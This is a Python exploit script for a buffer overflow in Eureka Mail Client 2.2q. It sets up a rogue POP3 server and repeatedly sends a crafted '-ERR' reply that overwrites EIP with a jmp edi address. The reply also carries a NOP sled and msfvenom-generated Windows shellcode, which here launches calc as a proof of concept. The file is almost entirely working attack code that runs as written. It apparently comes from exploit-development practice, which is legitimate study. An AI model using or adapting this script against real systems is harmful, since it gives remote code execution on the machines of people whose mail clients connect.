#!/usr/bin/python
# Eureka Mail Client 2.2q Buffer Overflow
# This should not have been stable without the egghunter but it seems to work so ¯\_(ツ)_/¯
# Working through egghunter version

import socket
import subprocess

server_ip = "X.X.X.X"
server_port = 110
# Payload must be prepended with -ERR string to trigger crash
prepend = "-ERR "
eip_offset = "A" * (723 - len(server_ip))
# during crash EIP, ESP, and EDI were all overwritten
# jmp edi instruction at 0x7e45ae56
ret = "\x56\xae\x45\x7e"
padding = "\x90" * (2997 - len(eip_offset) - len(ret))
# msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x20\x0a\x0d"
# used standard bad chars, no bad chars were indicated
buf =  ""
buf += "\xb8\xc3\x74\x26\xef\xd9\xc8\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x30\x83\xee\xfc\x31\x46\x0f\x03\x46\xcc\x96"
buf += "\xd3\x13\x3a\xd4\x1c\xec\xba\xb9\x95\x09\x8b\xf9\xc2"
buf += "\x5a\xbb\xc9\x81\x0f\x37\xa1\xc4\xbb\xcc\xc7\xc0\xcc"
buf += "\x65\x6d\x37\xe2\x76\xde\x0b\x65\xf4\x1d\x58\x45\xc5"
buf += "\xed\xad\x84\x02\x13\x5f\xd4\xdb\x5f\xf2\xc9\x68\x15"
buf += "\xcf\x62\x22\xbb\x57\x96\xf2\xba\x76\x09\x89\xe4\x58"
buf += "\xab\x5e\x9d\xd0\xb3\x83\x98\xab\x48\x77\x56\x2a\x99"
buf += "\x46\x97\x81\xe4\x67\x6a\xdb\x21\x4f\x95\xae\x5b\xac"
buf += "\x28\xa9\x9f\xcf\xf6\x3c\x04\x77\x7c\xe6\xe0\x86\x51"
buf += "\x71\x62\x84\x1e\xf5\x2c\x88\xa1\xda\x46\xb4\x2a\xdd"
buf += "\x88\x3d\x68\xfa\x0c\x66\x2a\x63\x14\xc2\x9d\x9c\x46"
buf += "\xad\x42\x39\x0c\x43\x96\x30\x4f\x09\x69\xc6\xf5\x7f"
buf += "\x69\xd8\xf5\x2f\x02\xe9\x7e\xa0\x55\xf6\x54\x85\xaa"
buf += "\xbc\xf5\xaf\x22\x19\x6c\xf2\x2e\x9a\x5a\x30\x57\x19"
buf += "\x6f\xc8\xac\x01\x1a\xcd\xe9\x85\xf6\xbf\x62\x60\xf9"
buf += "\x6c\x82\xa1\x9a\xf3\x10\x29\x5d"
payload = prepend + eip_offset + ret + padding + buf

def main():
    # create a server listening on port 110 to simulate a pop3 server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((server_ip, server_port))
    s.listen(2)
    print "[+] Server listening on port 110 for connections..."

    (client, ( client_ip, client_port)) = s.accept()
    
    # send the payload when the mail client reaches out to send/receive mail from the pop3 server
    # payload must be sent repeatedly
    while True:
        print "[+] Sending payload of " + str(len(payload)) + " bytes..."
        client.send(payload)

    print "[!] Payload sent!"
    print "[+] Closing client connection..."
    client.close()
    print "[+] Closing server..."
    s.close()

if __name__ == '__main__':
    main()
